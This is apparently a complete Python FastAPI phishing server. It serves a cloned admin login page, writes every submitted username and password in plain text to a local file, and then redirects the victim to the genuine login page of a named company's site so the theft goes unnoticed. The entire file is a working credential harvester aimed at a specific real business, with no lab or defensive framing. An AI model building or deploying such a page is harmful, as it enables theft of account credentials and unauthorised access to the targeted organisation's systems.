from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.responses import RedirectResponse

app = FastAPI()


# Configura la carpeta de templates
templates = Jinja2Templates(directory="./")

app.mount("/edradminlogin_files", StaticFiles(directory="edradminlogin_files"), name="edradminlogin_files")

@app.get("/auth", response_class=HTMLResponse)
async def mostrar_formulario(request: Request):
    return templates.TemplateResponse("edradminlogin.html", {"request": request})

@app.post("/login")
async def procesar_login(usuario: str = Form(...), clave: str = Form(...)):
    with open("credenciales.txt", "a") as f:
        f.write(f"Usuario: {usuario} | Clave: {clave}\n")
    
    return RedirectResponse("https://www.ecuadordirectroses.com:9000/auth/login")
